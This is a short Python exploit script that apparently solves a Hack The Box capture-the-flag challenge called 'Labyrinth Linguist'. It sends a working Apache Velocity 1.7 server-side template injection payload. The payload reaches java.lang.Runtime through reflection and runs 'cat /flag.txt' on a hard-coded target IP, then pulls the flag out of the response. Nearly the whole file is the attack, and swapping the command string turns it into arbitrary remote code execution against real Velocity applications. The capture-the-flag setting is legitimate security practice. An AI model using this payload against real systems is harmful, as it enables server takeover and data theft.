#!/usr/bin/env python3
"""Labyrinth Linguist — Apache Velocity 1.7 SSTI → cat /flag.txt."""
from __future__ import annotations

import argparse
import re
import sys
import urllib.parse
import urllib.request

FLAG_RE = re.compile(r"HTB\{[^}]+\}")
H2_RE = re.compile(r"(?s)<h2[^>]*>(.*?)</h2>")

# Velocity 1.7: empty-string .class.forName chain, print process stdout as chars.
PAYLOAD = (
    "#set($s='')#set($rt=$s.class.forName('java.lang.Runtime'))"
    "#set($chr=$s.class.forName('java.lang.Character'))"
    "#set($str=$s.class.forName('java.lang.String'))"
    "#set($ex=$rt.getRuntime().exec('cat /flag.txt'))$ex.waitFor()"
    "#set($out=$ex.getInputStream())"
    "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
)


def post_text(base: str, text: str, timeout: float = 25.0) -> str:
    data = urllib.parse.urlencode({"text": text}).encode()
    req = urllib.request.Request(
        base.rstrip("/"),
        data=data,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode("utf-8", errors="replace")


def exploit(base: str) -> str:
    body = post_text(base, PAYLOAD)
    m = FLAG_RE.search(body)
    if m:
        return m.group(0)
    h2 = H2_RE.search(body)
    raise SystemExit(f"no flag; h2={h2.group(1) if h2 else body[:200]!r}")


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://154.57.164.72:30986")
    args = p.parse_args()
    print(exploit(args.target))
    return 0


if __name__ == "__main__":
    sys.exit(main())
